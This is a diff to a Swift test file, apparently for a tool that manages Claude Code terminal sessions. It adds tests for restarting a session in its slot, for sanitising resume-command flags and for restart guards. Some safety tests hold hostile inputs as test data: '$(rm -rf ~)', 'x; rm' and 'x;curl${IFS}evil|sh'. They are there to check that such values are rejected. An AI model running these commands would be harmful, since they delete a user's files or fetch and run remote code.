@@ -132,6 +132,32 @@ func navTests() {
         let confirmed = SessionNav.applyPendingNames(live: [session("a", title: "New")], recent: [], pending: ["a": "New"])
         expect(confirmed.pending.isEmpty)
     }
+    test("restart: the session comes back in its own slot") {
+        func started(_ id: String, _ t: Double, pid: Int32 = 1, cwd: String = "/tmp/project") -> Session {
+            var s = session(id, pid: pid, cwd: cwd); s.startedAt = Date(timeIntervalSince1970: t); return s
+        }
+        let a = started("a", 10), b = started("b", 20, cwd: "/x"), c = started("c", 30, cwd: "/y")
+        let ticket = RestartTicket(session: b, at: Date(timeIntervalSince1970: 100))
+
+        // Mid-restart: b holds its place (⌘2) while it's gone.
+        expectEqual(SessionNav.keepSlots(live: [a, c], slots: [:], restarting: ticket).map(\.id), ["a", "b", "c"])
+        expect(SessionNav.restarted(ticket, in: [a, c]) == nil)
+        expect(SessionNav.restarted(ticket, in: [a, b, c]) == nil, "the old process isn't the comeback")
+
+        // Back under the same id (new process, later start): the remembered start time keeps the slot.
+        let sameId = started("b", 200, pid: 9, cwd: "/x")
+        expectEqual(SessionNav.restarted(ticket, in: [a, c, sameId])?.id, "b")
+        expectEqual(SessionNav.keepSlots(live: [a, c, sameId], slots: ["b": b.startedAt!], restarting: nil).map(\.id), ["a", "b", "c"])
+
+        // Back under a new id in the same folder.
+        let newId = started("z", 101, pid: 9, cwd: "/x")
+        expectEqual(SessionNav.restarted(ticket, in: [a, c, newId])?.id, "z")
+        expect(SessionNav.restarted(ticket, in: [a, c, started("z", 50, pid: 9, cwd: "/x")]) == nil, "started before the restart")
+        expect(SessionNav.restarted(ticket, in: [a, c, started("z", 101, pid: 9, cwd: "/other")]) == nil)
+        var noStart = newId; noStart.startedAt = nil
+        expect(SessionNav.restarted(ticket, in: [noStart]) == nil)
+        expectEqual(SessionNav.keepSlots(live: [a, c, newId], slots: ["z": b.startedAt!], restarting: nil).map(\.id), ["a", "z", "c"])
+    }
 }
 
 func terminalTests() {
@@ -178,6 +204,17 @@ func terminalTests() {
 }
 
 func safetyTests() {
+    test("resume command keeps only plain, known flags") {
+        let id = "0f8fad5b-d9cb-469f-a165-70867728950e"
+        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: ["claude"]), "claude --resume \(id)")
+        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: [
+            "claude", "--dangerously-skip-permissions", "--model", "opus[1m]", "--permission-mode=plan",
+            "--resume", "old", "--settings", "x.json", "--verbose"]),
+            "claude --resume \(id) --dangerously-skip-permissions --model 'opus[1m]' --permission-mode 'plan' --verbose")
+        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: ["claude", "--model", "$(rm -rf ~)", "--model"]),
+                    "claude --resume \(id)")
+        expect(Safety.resumeCommand(sessionId: "x; rm", originalArgs: []) == nil)
+    }
     test("session ids") {
         expect(Safety.isSessionId("904d7e05-e5d3-4b07-97e8-5d5358ca80c4"))
         expect(!Safety.isSessionId("x;curl${IFS}evil|sh"))
@@ -208,6 +245,10 @@ func safetyTests() {
         expect(!PromptGuard.canInterrupt(rec("idle")), "would clear a typed draft")
         expect(!PromptGuard.canInterrupt(rec("waiting")), "would deny the open prompt")
         expect(!PromptGuard.canInterrupt(nil))
+        expect(PromptGuard.canRestart(rec("idle")))
+        expect(!PromptGuard.canRestart(rec("busy")), "would quit mid-step")
+        expect(!PromptGuard.canRestart(rec("waiting")))
+        expect(!PromptGuard.canRestart(nil))
         expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: 1000.0004))
         expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: nil))
         expect(!PromptGuard.canAnswer(rec("waiting", since: 2000), expectedSince: 1000), "a newer prompt")
